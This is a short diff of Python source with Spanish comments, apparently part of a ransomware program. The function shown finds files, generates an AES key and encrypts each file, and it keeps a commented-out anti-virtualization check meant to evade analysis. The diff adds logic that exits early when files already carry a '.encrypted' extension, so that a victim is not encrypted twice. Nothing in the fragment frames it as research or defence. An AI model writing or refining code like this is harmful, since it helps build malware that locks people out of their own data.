@@ -52,6 +52,9 @@ def encrypt_file(file, aes_key):
 def encrypt_files():
     #antianalysis.check_virtualization() # Comprobación anti-virtualización
     files = find_files()  # Obtener lista de archivos a cifrar
+    for file in files:
+        if file.endswith('.encrypted'): # Comprobación de ejecución anterior
+            sys.exit(0)  # Termina el programa con código de salida 0 (sin error)
     gen_keys.generate_aes_key()  # Generar clave simétrica
     aes_key = load_aes_key()  # Cargar la clave simétrica
     for file in files: # Cifra cada archivo con la clave AES
